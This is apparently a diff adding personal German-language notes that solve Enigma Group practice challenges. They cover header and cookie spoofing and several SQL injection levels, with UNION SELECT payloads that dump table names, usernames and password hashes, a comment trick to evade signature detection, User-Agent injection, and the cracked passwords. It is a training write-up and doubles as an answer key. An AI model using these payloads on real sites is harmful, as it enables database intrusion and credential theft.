@@ -1,0 +1,34 @@
+#Spoofing#
+
+***Spoofing 1 - Basic 16*** irgendeinen transparenten Proxy in Firefox eintragen
+***Spoofing 2 - Basic 17*** Addon ModHeader --> Attribut UserAgent hinzufügen und setzen
+***Spoofing 3 - Basic 18*** Addon ModHeader --> Attribut Referrer hinzufügen und setzen
+***Spoofing 4 - Basic 19*** --> Webentwickler --> Bildschirmgröße testen --> 1337x1337px einstellen
+***Spoofing 5 - Basic 20*** --> Konsole --> Web-Speicher --> cookie wert ändern
+================================================================================================================================
+#SQL Injections#
+***SQL 2 - Basic 22*** 
+	Apostroph an URL anfügen, um zu testen, ob seite angreifbar --> Spaltenzahl mit ORDER BY herausfinden 
+	--> Table names: union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--
+
+	http://challenges.enigmagroup.org/basics/sql/2/index.php?id=1 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--
+
+	--> Tipp sagt tablename 'users' --> Spalten rausfinden als nächstes
+	--> http://challenges.enigmagroup.org/basics/sql/2/index.php?id=1 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name="users"-- --> Forbidden
+	--> Password: (..).index.php?id=-1 UNION SELECT 1,2,password from users-- | Ausgabe: 6537d34fd1c080b5cb7f06dde3a26fe8 (gehasht?)
+	--> Username: (...).index.php?id=-1 UNION SELECT 1,2,username from users--  | Ausgabe: administrator
+	--> John the Ripper: bl1nd
+===============================================================================================================================
+***SQL 3***
+	--> Mit ORDER BY --> 3 Spalten
+	--> *.index.php?id=-4 UNION SELECT 1,username,password FROM users-- --> Warning weil signature detection verwendet wird
+	--> *.index.php?id=-4 UNION /**/ SELECT 1,username,password FROM  users-- (insert comment to evade signature detection)
+	--> username = administrator, password= 6cfdca6f9633968c72a2a6e0fe2756ca
+	--> online decrypter liefert a152e841783914146e4bcd4f39100686 --> durch hashcat jagen --> asdfg
+===============================================================================================================================
+***SQL 4***
+	--> Firefox Addon User Agent Switcher --> Hallo); SELECT ALL FROM USERS-- eintragen als Agent eintragen
+	--> Fehler verrät Tabelle SQL4logs
+	--> asd', (SELECT group_concat(table_name) FROM information_schema.tables where table_schema = database())-- verrät Tabelle SQL4users
+
+	
